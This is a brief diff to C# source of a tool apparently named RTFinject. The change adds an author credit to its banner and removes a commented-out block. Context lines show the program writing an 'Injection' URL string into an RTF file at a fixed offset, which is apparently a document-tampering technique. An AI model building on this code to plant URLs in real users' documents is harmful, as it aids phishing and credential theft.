@@ -33,7 +33,10 @@ namespace RTFinject
        @@                                *@@      
        @@                                *@@      
        @@                                *@@      
-       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                ");
+       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
+
+
+              Created by @mansk1es");
 
             if (args == null | args.Length == 0)
             {
@@ -71,11 +74,6 @@ namespace RTFinject
 
                             byte[] urlBytes = Encoding.ASCII.GetBytes(Injection);
 
-                            /*
-                            using (StreamReader sr = new StreamReader(rtfPath)) { string contents = sr.ReadToEnd();
-                                if (contents.Contains("")){ }
-                            }
-                            */
                             using (var stream = new FileStream(rtfPath, FileMode.Open, FileAccess.ReadWrite))
                             {
                                 stream.Position = 50;
